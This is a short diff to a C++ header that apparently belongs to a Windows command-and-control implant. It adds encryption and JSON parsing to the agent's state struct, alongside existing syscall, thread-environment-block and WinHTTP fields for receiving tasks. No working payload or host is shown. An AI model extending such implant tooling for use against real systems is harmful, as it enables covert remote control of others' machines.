@@ -6,15 +6,22 @@
 #include <windows.h>
 #include <winhttp.h>
 
+#include "core/crypt.hpp"
 #include "core/socket.hpp"
+#include "core/parser.hpp"
 #include "core/procs.hpp"
 #include "core/syscalls.hpp"
 #include "core/system.hpp"
+
+using json = nlohmann::json;
 
 namespace State
 {
     struct STATE
     {
+        // Crypto
+        Crypt::PCRYPT       pCrypt;
+
         // Thread environment block
         PTEB                pTeb;
 
@@ -58,8 +65,9 @@ namespace State
 
         // Agent options
         std::wstring        wUUID;
-        std::wstring        wTask;
-        std::wstring        wTaskResult;
+        std::wstring        wTask; // Encrypted
+        json                taskJSON;
+        json                taskResultJSON;
 
         // WinHTTP handlers
         HINTERNET           hSession;
